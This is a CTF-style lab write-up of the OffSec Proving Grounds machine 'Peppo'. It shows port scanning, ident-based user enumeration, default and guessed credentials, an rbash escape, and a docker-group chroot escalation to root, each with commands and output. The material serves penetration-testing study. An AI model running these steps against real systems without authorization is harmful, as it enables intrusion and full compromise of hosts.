---
title: "Proving grounds Practice: Peppo"
layout: post
date: 2024-04-12 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- Docker
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

# NMAP

```text
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
113/tcp   open  ident             FreeBSD identd
5432/tcp  open  postgresql        PostgreSQL DB 12.3 - 12.4
8080/tcp  open  http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
10000/tcp open  snet-sensor-mgmt?
```

## 8080/tcp  open  http  WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))

admin:admin

password change -> password

## 113/tcp   open  ident   FreeBSD identd

`sudo apt install ident-user-enum`

```sh
naveenj@hackerspace:[09:32]~/proving_grounds/Peppo$ ident-user-enum 192.168.196.60 113 22 10000
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.196.60:113	nobody
192.168.196.60:22	root
192.168.196.60:10000	eleanor
```

## 10000/tcp open  snet-sensor-mgmt?

user: eleanor

## 22/tcp    open  ssh   OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)

- Try brute forcing credentials using username as eleanor. `eleanor:eleanor`

***Escape rbash***

- https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/

Export necessary PATH

```sh
leanor@peppo:~/bin$ PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
eleanor@peppo:~/bin$ python -c 'import pty; pty.spawn("/bin/bash")'
eleanor@peppo:~/bin$ id
bash: id: command not found
n:/binr@peppo:~/bin$ PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin
eleanor@peppo:~/bin$ id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
```

## Privilege Escalation

- User & Groups: uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)

### Docker exploit

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

List Docker images in the system.

```sh
eleanor@peppo:/tmp$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        3 years ago         542MB
postgres            latest              adf2b126dda8        3 years ago         313MB
```

Run `docker run -v /:/mnt --rm -it redmine chroot /mnt s`

```sh
eleanor@peppo:/tmp$ docker run -v /:/mnt --rm -it redmine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
```

**Root Obtained**

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).